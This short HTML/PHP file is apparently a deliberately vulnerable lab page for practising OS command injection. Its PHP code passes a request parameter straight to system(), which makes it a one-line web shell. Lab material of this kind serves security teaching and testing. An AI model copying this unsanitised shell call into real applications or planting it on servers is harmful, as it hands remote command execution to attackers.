<html>
<body>
<title>Vulnerable Page</title>
<p><b>We will test  OS command injection vulnerability against this pages. Actually developer don't know how serious the code is.</b></p>

<p><b>Output of command:</b></p> </body></html>

<?php 
system($_REQUEST['cmd']); 
?>


